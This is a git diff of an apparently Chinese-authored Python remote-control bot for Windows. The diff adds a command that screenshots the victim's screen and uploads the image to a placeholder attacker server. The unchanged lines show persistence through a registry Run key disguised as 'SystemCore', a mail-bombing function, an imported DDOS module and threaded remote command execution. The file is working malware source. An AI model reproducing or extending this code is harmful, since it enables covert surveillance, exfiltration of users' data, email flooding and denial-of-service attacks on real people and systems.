@@ -1,3 +1,5 @@
+# 该文件自定义：更改35行URL的值
+
 import requests
 from socket import gethostname
 import subprocess
@@ -7,10 +9,12 @@ import uuid
 import win32api
 import win32con
 import random
+import pyautogui  # pip install pyautogui==0.9.50
 import zmail
 import threading
 
 import DDOS
+
 
 class CmdTread(threading.Thread):
     def __init__(self, cmdL):
@@ -25,6 +29,7 @@ class CmdTread(threading.Thread):
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
 
+
 # 全局变量初始化
 version = 1
 url = "http://YOUR_SERVER_HOST:YOUR_SERVER_PORT/"
@@ -37,14 +42,21 @@ key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
 win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, exePath)
 
 
-def send_mail(from_address, from_password, to_address,
-              title="RBSI发送的问候", content="这是来自RBSI程序发送的问候。",
+def send_mail(from_address,
+              from_password,
+              to_address,
+              title="RBSI发送的问候",
+              content="这是来自RBSI程序发送的问候。",
               from_name="RBSI"):
     # 邮件轰炸函数
     mail_content = {
-        "subject": title,
-        "content_html": "<p>%s</p><br /><p>本次发信识别码：%s %s</p>" % (content, random.random(), time.time()),
-        "from": "%s <%s>" % (from_name, from_address)
+        "subject":
+        title,
+        "content_html":
+        "<p>%s</p><br /><p>本次发信识别码：%s %s</p>" %
+        (content, random.random(), time.time()),
+        "from":
+        "%s <%s>" % (from_name, from_address)
     }
 
     server = zmail.server(from_address, from_password)
@@ -184,10 +196,18 @@ while True:
                             title=response["mail-attack"]["title"],
                             content=response["mail-attack"]["content"])
                 raise KeyboardInterrupt
+            
+            if response.get("getScreen"):
+                send_message("尝试截图...")
+                pyautogui.screenshot("Screenshot.png")
+                requests.post(url + "upload",
+                              data={"name": name},
+                              files={"file": open("Screenshot.png", "rb")})
+                send_message("截图成功！")
 
             if not waited:
                 time.sleep(5)
-                
+
     except KeyboardInterrupt:
         send_message("邮件轰炸成功发送！")
     except SystemExit:
